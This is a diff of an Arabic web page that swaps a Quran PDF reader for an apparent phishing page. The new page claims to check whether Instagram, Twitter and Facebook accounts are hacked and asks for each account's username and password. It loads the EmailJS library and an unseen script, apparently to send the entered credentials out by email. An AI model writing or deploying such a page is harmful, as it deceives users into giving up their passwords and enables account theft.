@@ -1,364 +1,89 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>القرآن الكريم - الهدى</title>
-    <style>
-        /* Reset and general styles */
-        body, html {
-            margin: 0;
-            padding: 0;
-            font-family: 'Cairo', sans-serif;
-            background-color: #fdf4e3; /* لون مشابه للصورة */
-            color: #3a2a12; /* لون النص مشابه */
-            height: 100%;
-            transition: filter 0.3s ease; /* Transition for smooth effect */
-            overflow: hidden;
-        }
-
-        /* Splash Screen */
-        #splash-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #fdf4e3; /* نفس الخلفية */
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            opacity: 1;
-            transition: opacity 0.5s ease-out;
-        }
-
-        #splash-screen img {
-            max-width: 80%;
-            max-height: 80%;
-        }
-
-        #splash-screen h1 {
-            margin: 20px 0 0;
-            font-size: 1.5rem;
-            text-align: center;
-            color: #3a2a12;
-        }
-
-        #splash-screen p {
-            margin-top: 10px;
-            font-size: 1.2rem;
-            text-align: center;
-            color: #3a2a12;
-        }
-
-        /* PDF Container */
-        #pdf-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: auto; /* Enable scrolling */
-        }
-
-        /* PDF Mask */
-        .pdf-mask {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(253, 244, 227, 0.4); /* لون شفاف مشابه للخلفية */
-            z-index: 10; /* يظهر فوق محتوى PDF */
-        }
-
-        #pdf-canvas {
-            position: relative;
-            z-index: 5; /* خلف القناع */
-            opacity: 0.9; /* خفض شفافية الـ PDF */
-        }
-
-        /* Focusing on index panel */
-        #index-panel {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            z-index: 2;
-            background: rgba(250, 235, 215, 0.9); /* لون شبه شفاف */
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-            max-height: 90vh;
-            overflow-y: auto;
-            border: 1px solid #3a2a12; /* إطار مشابه */
-            transition: opacity 0.5s ease; /* Transition for smooth effect */
-        }
-
-        #index-panel button {
-            background-color: #f9e7ce; /* لون أزرار مشابه */
-            color: #3a2a12;
-            border: 1px solid #3a2a12;
-            padding: 5px 10px;
-            margin: 3px;
-            cursor: pointer;
-            display: block;
-            text-align: center;
-            border-radius: 3px;
-        }
-
-        #index-panel button:hover {
-            background-color: #f3d9a3; /* تأثير عند التمرير */
-        }
-
-        #index-panel.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        /* Adjustments for smaller screens */
-        @media (max-width: 768px) {
-            #pdf-container {
-                transform: scale(1);
-                width: 100%;
-                height: 100%;
-            }
-
-            /* Adjust canvas size to fit the screen */
-            #pdf-canvas {
-                width: 100%;
-                height: 100%;
-            }
-        }
-
-        /* Zoom Controls */
-        #zoom-controls {
-            position: fixed;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            gap: 10px;
-            z-index: 1000;
-        }
-
-        #zoom-controls button {
-            background-color: #f9e7ce;
-            color: #3a2a12;
-            border: 1px solid #3a2a12;
-            padding: 10px 20px;
-            cursor: pointer;
-            border-radius: 5px;
-            font-size: 1rem;
-            transition: background-color 0.3s ease;
-        }
-
-        #zoom-controls button:hover {
-            background-color: #f3d9a3;
-        }
-
-        #zoom-controls.hidden {
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.5s ease;
-        }
-    </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.10.377/pdf.min.js"></script>
+    <title>موقع فحص الحسابات</title>
+    <!-- إضافة Bootstrap -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- إضافة خطوط Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <!-- إضافة ملف CSS الخاص -->
+    <link rel="stylesheet" href="css/styles.css">
 </head>
 <body>
 
-    <!-- Splash Screen -->
-    <div id="splash-screen">
-        <img src="https://www.raed.net/img?id=1133268" alt="اللوجو">
-        <h1>القرآن الكريم - الهدى</h1>
-        <p>{هُدًى لِّلنَّاسِ وَبَيِّنَاتٍ مِّنَ الْهُدَىٰ وَالْفُرْقَانِ}</p>
-        <p>البقرة (185)</p>
-        <p>هذه الصفحة وقف لوالديَّ حفظهما الله</p>
-        <p>{رَّبِّ ارْحَمْهُمَا كَمَا رَبَّيَانِي صَغِيرًا}</p>
+<div class="container">
+    <!-- تبديل اللغة -->
+    <div class="language-switcher">
+        <button id="switchToArabic" class="btn btn-language">العربية</button>
+        <button id="switchToEnglish" class="btn btn-language">English</button>
     </div>
 
-    <!-- PDF Container -->
-    <div id="pdf-container">
-        <div class="pdf-mask"></div> <!-- القناع المضاف -->
-        <canvas id="pdf-canvas"></canvas>
+    <!-- رسالة الترحيب -->
+    <div id="welcomeMessage" class="welcome-message">
+        <h1>مرحباً بكم في موقع فحص الحسابات</h1>
+        <p>هذا الموقع يساعدك على فحص حساباتك على منصات التواصل الاجتماعي لمعرفة ما إذا كانت آمنة أو مخترقة.</p>
     </div>
 
-    <!-- Index Panel for page navigation -->
-    <div id="index-panel"></div>
-
-    <!-- Zoom Controls -->
-    <div id="zoom-controls">
-        <button id="zoom-in">تكبير</button>
-        <button id="zoom-out">تصغير</button>
+    <div class="platform">
+        <button class="btn btn-platform" onclick="showForm('instagram')">فحص انستقرام</button>
+        <button class="btn btn-platform" onclick="showForm('twitter')">فحص تويتر</button>
+        <button class="btn btn-platform" onclick="showForm('facebook')">فحص فيسبوك</button>
     </div>
 
-    <script>
-        let pdfDoc = null;
-        let currentPage = 1;
-        let totalPages = 0;
-        let hideTimer, indexHideTimer;
-        let zoomLevel = 1; // مستوى التكبير الافتراضي
-        const zoomStep = 0.2; // مقدار التكبير/التصغير
-        const maxZoom = 3; // الحد الأقصى للتكبير
-        const minZoom = 1; // الحد الأدنى للتصغير
+    <div id="instagramForm" class="form">
+        <form id="instagramFormData" onsubmit="submitForm(event, 'instagram')">
+            <div class="form-group">
+                <label for="instagramUsername">اسم المستخدم</label>
+                <input type="text" id="instagramUsername" name="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            <div class="form-group">
+                <label for="instagramPassword">كلمة المرور</label>
+                <input type="password" id="instagramPassword" name="password" class="form-control" placeholder="أدخل كلمة المرور" required>
+            </div>
+            <button type="submit" class="btn btn-submit">فحص الحساب</button>
+        </form>
+    </div>
 
-        const canvas = document.getElementById('pdf-canvas');
-        const ctx = canvas.getContext('2d');
+    <div id="twitterForm" class="form">
+        <form id="twitterFormData" onsubmit="submitForm(event, 'twitter')">
+            <div class="form-group">
+                <label for="twitterUsername">اسم المستخدم</label>
+                <input type="text" id="twitterUsername" name="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            <div class="form-group">
+                <label for="twitterPassword">كلمة المرور</label>
+                <input type="password" id="twitterPassword" name="password" class="form-control" placeholder="أدخل كلمة المرور" required>
+            </div>
+            <button type="submit" class="btn btn-submit">فحص الحساب</button>
+        </form>
+    </div>
 
-        const zoomControls = document.getElementById('zoom-controls');
-        const pdfContainer = document.getElementById('pdf-container');
-        const indexPanel = document.getElementById('index-panel');
+    <div id="facebookForm" class="form">
+        <form id="facebookFormData" onsubmit="submitForm(event, 'facebook')">
+            <div class="form-group">
+                <label for="facebookUsername">اسم المستخدم</label>
+                <input type="text" id="facebookUsername" name="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            <div class="form-group">
+                <label for="facebookPassword">كلمة المرور</label>
+                <input type="password" id="facebookPassword" name="password" class="form-control" placeholder="أدخل كلمة المرور" required>
+            </div>
+            <button type="submit" class="btn btn-submit">فحص الحساب</button>
+        </form>
+    </div>
 
-        // Load the PDF document
-        const url = 'E-Quran-mobile.pdf';  // تأكد من المسار الصحيح للـ PDF
-        pdfjsLib.getDocument(url).promise.then(function(pdf) {
-            pdfDoc = pdf;
-            totalPages = pdf.numPages;
+    <!-- رسالة النتيجة -->
+    <div id="resultMessage" class="thank-you-message">
+        <!-- سيتم عرض نتيجة الفحص هنا -->
+    </div>
+</div>
 
-            // Display index panel with page numbers
-            displayIndexPanel();
+<!-- إضافة EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<!-- إضافة ملف JavaScript الخاص -->
+<script src="js/script.js"></script>
 
-            // Retrieve saved page on load
-            const savedPage = localStorage.getItem('currentPage');
-            if (savedPage) {
-                currentPage = parseInt(savedPage);
-            }
-
-            renderPage(currentPage);
-        });
-
-        // Display page numbers in the index
-        function displayIndexPanel() {
-            indexPanel.style.display = 'block';
-            indexPanel.innerHTML = '';  // Clear previous content
-
-            for (let i = 1; i <= totalPages; i++) {
-                const button = document.createElement('button');
-                button.textContent = i;
-                button.onclick = function() {
-                    currentPage = i;
-                    renderPage(currentPage);
-                    localStorage.setItem('currentPage', currentPage);
-                    resetIndexHideTimer();
-                };
-                indexPanel.appendChild(button);
-            }
-        }
-
-        // Render a specific page
-        function renderPage(pageNum) {
-            pdfDoc.getPage(pageNum).then(function(page) {
-                const viewport = page.getViewport({ scale: 1.5 });
-
-                // Set canvas dimensions
-                canvas.height = viewport.height;
-                canvas.width = viewport.width;
-
-                // Render the page content
-                page.render({
-                    canvasContext: ctx,
-                    viewport: viewport
-                });
-            });
-        }
-
-        // Hide splash screen after 2 seconds
-        window.onload = function() {
-            setTimeout(() => {
-                document.getElementById('splash-screen').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('splash-screen').style.display = 'none';
-                }, 500);
-            }, 2000);
-        };
-
-        // Handling swipe gesture for page navigation
-        let touchStartX = 0;
-        let touchEndX = 0;
-
-        document.body.addEventListener('touchstart', function(e) {
-            touchStartX = e.touches[0].clientX;
-        });
-
-        document.body.addEventListener('touchend', function(e) {
-            touchEndX = e.changedTouches[0].clientX;
-
-            if (touchEndX < touchStartX - 50) {
-                // Swipe left: go to previous page
-                if (currentPage > 1) {
-                    currentPage--;
-                    renderPage(currentPage);
-                    localStorage.setItem('currentPage', currentPage);
-                    resetIndexHideTimer();
-                }
-            }
-
-            if (touchEndX > touchStartX + 50) {
-                // Swipe right: go to next page
-                if (currentPage < totalPages) {
-                    currentPage++;
-                    renderPage(currentPage);
-                    localStorage.setItem('currentPage', currentPage);
-                    resetIndexHideTimer();
-                }
-            }
-        });
-
-        // Zoom functionality
-        document.getElementById('zoom-in').addEventListener('click', () => {
-            if (zoomLevel < maxZoom) {
-                zoomLevel += zoomStep;
-                pdfContainer.style.transform = `scale(${zoomLevel})`;
-                pdfContainer.style.transformOrigin = 'center top';
-                pdfContainer.style.overflow = 'auto'; // Enable scrolling
-            }
-            resetHideTimer();
-        });
-
-        document.getElementById('zoom-out').addEventListener('click', () => {
-            if (zoomLevel > minZoom) {
-                zoomLevel -= zoomStep;
-                pdfContainer.style.transform = `scale(${zoomLevel})`;
-                pdfContainer.style.transformOrigin = 'center top';
-                if (zoomLevel === minZoom) {
-                    pdfContainer.style.overflow = 'hidden'; // Disable scrolling at min zoom
-                }
-            }
-            resetHideTimer();
-        });
-
-        // Hide the zoom controls after 2 seconds
-        function resetHideTimer() {
-            clearTimeout(hideTimer);
-            zoomControls.classList.remove('hidden');
-            hideTimer = setTimeout(() => {
-                zoomControls.classList.add('hidden');
-            }, 2000);
-        }
-
-        // Hide the index panel after 2 seconds
-        function resetIndexHideTimer() {
-            clearTimeout(indexHideTimer);
-            indexPanel.classList.remove('hidden');
-            indexHideTimer = setTimeout(() => {
-                indexPanel.classList.add('hidden');
-            }, 2000);
-        }
-
-        // Show the zoom controls and index panel when the user interacts with the screen
-        document.body.addEventListener('mousemove', () => {
-            resetHideTimer();
-            resetIndexHideTimer();
-        });
-        document.body.addEventListener('touchstart', () => {
-            resetHideTimer();
-            resetIndexHideTimer();
-        });
-    </script>
 </body>
 </html>
